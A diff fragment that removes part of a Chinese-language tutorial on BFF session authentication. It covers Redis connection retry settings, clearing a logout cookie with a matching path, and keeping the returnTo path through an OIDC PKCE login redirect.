-额外：对 Redis 连接配置连接池和重试逻辑：
-
-```typescript
-// src/redis/redis.service.ts
-import Redis from 'ioredis';
-
-const redis = new Redis({
-  host: process.env.REDIS_HOST,
-  port: Number(process.env.REDIS_PORT),
-  password: process.env.REDIS_PASSWORD,
-
-  // 连接失败时自动重试
-  retryStrategy: (times) => {
-    if (times > 10) return null; // 超过 10 次放弃
-    return Math.min(times * 100, 3000); // 指数退避，最多 3 秒
-  },
-
-  // 连接超时配置
-  connectTimeout: 10_000,
-  commandTimeout: 5_000,
-});
-```
-
-### 问题三：登出后 Cookie 仍然存在导致自动重新登录
-
-**症状**：用户点击登出后，重新访问应用又自动登录了。
-
-**原因**：登出时只删除了 Redis 中的 Session，但浏览器的 Cookie 没有清除（或者清除了但浏览器缓存仍然发送）。下次请求时，BFF 收到了一个合法的 Session Cookie，但在 Redis 里找不到对应的 Session，应该返回 401 而不是自动重新创建 Session。
-
-**解决**：
-
-1. 确保 `res.clearCookie()` 的 Cookie 属性和 `res.cookie()` 时一致（按 spec，`path`、`domain` 必须匹配）：
-
-```typescript
-// 设置 Cookie
-res.cookie('sess_id', sessionId, {
-  httpOnly: true,
-  secure: true,
-  sameSite: 'lax',
-  path: '/', // 记住这个 path
-  maxAge: 7 * 24 * 60 * 60 * 1000,
-});
-
-// 清除 Cookie，path 必须与设置时一致
-res.clearCookie('sess_id', {
-  path: '/', // 必须相同，否则清除无效
-});
-```
-
-2. BFF 在找不到 Session 时正确返回 401，让前端处理重新登录逻辑，而不是静默地为用户创建新 Session。
-
-### 问题四：OIDC 登录回调后重定向到错误的 returnTo 路径
-
-**症状**：用户在访问 `/orders/123` 时被要求登录，登录完成后没有跳转到 `/orders/123`，而是跳转到了 `/`。
-
-**原因**：`returnTo` 值在整个登录流程中没有被正确传递和保存。整个流程涉及三次跳转：
-
-1. 前端 `/orders/123` → BFF `/auth/login?returnTo=/orders/123`（returnTo 被传入）
-2. BFF → OIDC 授权服务器（returnTo 应该被存储，因为 OIDC 跳转不携带 returnTo）
-3. OIDC → BFF `/auth/callback`（BFF 从存储中取出 returnTo）
-
-关键是第 2 步：`returnTo` 必须随 PKCE 参数一起存入 Redis，在回调时取出。本篇的 `AuthService` 已经在 `pkce:${state}` 中存储了 `returnTo`，确认你的实现中也是这样做的。
-
-如果跳转仍然出错，可以在 BFF 的 callback 处理中加日志：
-
-```typescript
-async handleCallback(code: string, state: string) {
-  const pkceRaw = await this.redis.get(`pkce:${state}`);
-  console.log('PKCE session found:', !!pkceRaw);
-  const pkceData = JSON.parse(pkceRaw!) as PkceSession;
-  console.log('returnTo:', pkceData.returnTo);
-  // ...
-}
 ```
 
 ## 本篇小结
